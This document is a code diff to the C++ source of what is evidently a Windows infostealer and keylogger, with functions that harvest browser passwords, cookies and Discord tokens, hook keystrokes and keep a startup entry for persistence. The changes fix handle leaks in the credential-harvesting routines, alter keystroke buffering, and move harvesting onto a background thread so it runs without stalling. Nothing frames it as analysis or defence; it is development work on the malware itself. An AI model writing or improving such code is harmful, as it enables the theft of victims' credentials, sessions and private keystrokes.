@@ -53,6 +53,7 @@ static std::vector<std::string> g_triggers;
 static bool g_running = true;
 static bool g_selfDestructing = false;
 static bool g_harvestPaused = false;
+static bool g_harvestBusy = false;
 static std::string g_hostname;
 static std::string g_lastClipboard;
 static std::string g_lastPasswordDigest;
@@ -1383,7 +1384,7 @@ static void HarvestBrowserPasswords() {
             HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
             HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
             if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
-            if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); continue; }
+            if (!dbMap) { if (hM) CloseHandle(hM); if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); continue; }
 
             int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
 
@@ -1530,7 +1531,7 @@ static void HarvestBrowserCookies() {
                 HANDLE hF = CreateFileA(tmpCp.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                 HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
                 if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
-                if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpCp.c_str()); continue; }
+                if (!dbMap) { if (hM) CloseHandle(hM); if (hF) CloseHandle(hF); DeleteFileA(tmpCp.c_str()); continue; }
 
                 int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
                 int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "cookies");
@@ -2255,7 +2256,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (!keyStr.empty()) {
             g_keys += keyStr;
             g_lastTick = now;
-            if (g_keys.size() > 5000) FlushBuffer();
         }
         g_winTitle = newTitle;
     }
@@ -2332,10 +2332,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
             }
-            if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
-                HarvestBrowserPasswords();
-                HarvestBrowserCookies();
-                HarvestDiscordTokens();
+            if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused && !g_harvestBusy) {
+                g_harvestBusy = true;
+                CreateThread(NULL, 0, [](LPVOID) -> DWORD {
+                    HarvestBrowserPasswords();
+                    HarvestBrowserCookies();
+                    HarvestDiscordTokens();
+                    g_harvestBusy = false;
+                    return 0;
+                }, NULL, 0, NULL);
             }
             break;
         }
